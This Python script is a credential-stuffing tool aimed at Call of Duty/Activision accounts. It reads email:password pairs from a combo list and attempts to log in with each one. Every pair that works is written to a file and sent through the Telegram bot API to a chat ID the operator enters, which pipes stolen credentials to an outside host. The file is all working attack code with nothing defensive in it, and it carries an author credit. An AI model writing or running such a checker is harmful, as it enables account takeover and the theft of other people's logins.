import os
os.system('cls' if os.name == 'nt' else 'clear')

from time import sleep
import callofduty
from callofduty import Platform
import requests
import asyncio


a = 0
b = 0

banner = ("""
                                                    
 _____ _____ ____     _____ _           _  
|     |     |    \   |     | |_ ___ ___| |_ ___ ___ 
|   --|  |  |  |  |  |   --|   | -_|  _| '_| -_|  _|
|_____|_____|____/   |_____|_|_|___|___|_,_|___|_|  
                                                    
""")

async def Osama_amy(email,pasw,token,myID):
    global a,b,banner
    try:
        client = await callofduty.Login(str(email), str(pasw))
        results = await client.SearchPlayers(Platform.Activision, "test", limit=3)
        a +=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'{banner}\n\n[-] Done : {a}\t\t\t[-] Bad : {b}')
        f = open('combo.txt','a').write(f'{email}:{pasw}\n')
        try:
            O0Dev_Tele = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={myID}&text=❖ Email : {str(email)}\n❖ Pass : {str(pasw)}\n❖ Free By : @O0Dev'
            requests.get(O0Dev_Tele)
        except:
            pass
    except:
        b +=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'{banner}\n[-] Done : {a}\t\t\t[-] Bad : {b}')

try:
    List = open('combo.txt','r').read().splitlines()
except:
    print(banner)
    print('\n accounts.txt Not Found In The Same PATH')
    sleep(3)
    exit()

print(banner+'\n')
token = input('[+] Enter Telegram Bot Token : ')
myID  = input('[+] Enter Ur Telegram ID : ')

for line in List:
    line = line.replace(' ','')
    O0Dev = line.split(':')[0]
    inTelegram = line.split(':')[1]
    asyncio.get_event_loop().run_until_complete(Osama_amy(O0Dev,inTelegram,token,myID))
    